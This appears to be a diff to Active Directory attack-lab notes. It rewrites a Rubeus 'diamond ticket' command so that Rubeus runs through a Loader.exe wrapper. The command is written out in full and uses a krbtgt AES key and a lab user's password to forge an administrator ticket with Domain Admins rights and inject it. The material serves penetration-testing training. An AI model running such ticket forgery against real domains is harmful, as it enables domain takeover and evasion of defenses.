@@ -10,7 +10,7 @@ modification attack
 We would still need `krbtgt` AES keys to create a diamond ticket like so. Note that RC4 or AES keys of the user can be used
 too):
 ```powershell
-Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:student548 /password:cAyF6wTLSydnL2M7 /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+Loader.exe -path Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:student548 /password:cAyF6wTLSydnL2M7 /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 
 We could also use `/tgtdeleg` option in place of credentials in case we're running it as a domain user
